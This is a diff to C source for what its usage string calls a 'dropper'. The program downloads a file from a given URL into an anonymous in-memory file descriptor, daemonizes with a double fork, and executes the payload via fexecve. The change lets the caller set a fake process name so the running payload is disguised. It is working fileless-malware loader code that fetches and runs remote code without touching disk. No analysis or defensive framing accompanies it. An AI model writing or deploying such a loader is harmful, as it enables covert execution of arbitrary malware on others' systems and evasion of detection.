@@ -42,7 +42,7 @@ void write_file(char* url, char* filepath) {
 
         /* Check for Errors */
         if (res != CURLE_OK | res == CURLE_HTTP_RETURNED_ERROR ) {
-            fprintf(stderr, "curl_easy_perform() failed: %s\n", curl_easy_strerror(res));
+            fprintf(stderr, "Curl failed: %s\n", curl_easy_strerror(res));
             curl_easy_cleanup(curl);
             fclose(fp);
             exit(0);
@@ -54,7 +54,7 @@ void write_file(char* url, char* filepath) {
 }
 
 
-void exec_fd(int fd, char* argv[], char* evp[]){
+void exec_fd(int fd, char* pname, char* evp[]){
     printf("[+] Executing file\n");
 
     /* First Fork */
@@ -76,19 +76,20 @@ void exec_fd(int fd, char* argv[], char* evp[]){
     pid = fork();
     if (pid < 0)
         exit(EXIT_FAILURE);
-    if (pid > 0)
+    if (pid > 0) {
+        printf("[+] Process Spawned : %d\n", (int) pid);
         exit(EXIT_SUCCESS);
+    }
 
     /* Set new file permissions */
     umask(0);
     chdir("/");
     
     /* Execute File in Daemon Process */
-    char fname[128];
-    int j = snprintf(fname, 128, "/proc/self/fd/%d", fd);
-    char* p_argv[] = {fname, NULL};
+    char* p_argv[] = {pname, NULL};
     fexecve(fd, p_argv, evp);
 
+    // This should not be hit :O
     return;
 }
 
@@ -98,20 +99,22 @@ int main(int argc, char *argv[], char * envp[]){
     char* fd_name = "psovaya";
     int fd_num;
     char url[1024];
+    char procname[128];
     char fd_path[128];
-    char* usage = "Usage : ./dropper {url}\n";
+    char* usage = "Usage : ./dropper {url} {proc_name}\n";
 
     /* User Input */
-    if (argc != 2) {
+    if (argc != 3) {
         printf("Error : Incorrect count of Arguements\n%s", usage);
         exit(0);
     }
     strcpy(url, argv[1]);
+    strcpy(procname, argv[2]);
 
     /* Run Dropper */
     fd_num = create_memfd(fd_name);
     int j = snprintf(fd_path, 128, "/proc/self/fd/%d", fd_num);
     write_file(url, fd_path);
-    exec_fd(fd_num, argv, envp);
+    exec_fd(fd_num, procname, envp);
     return 0;
 }
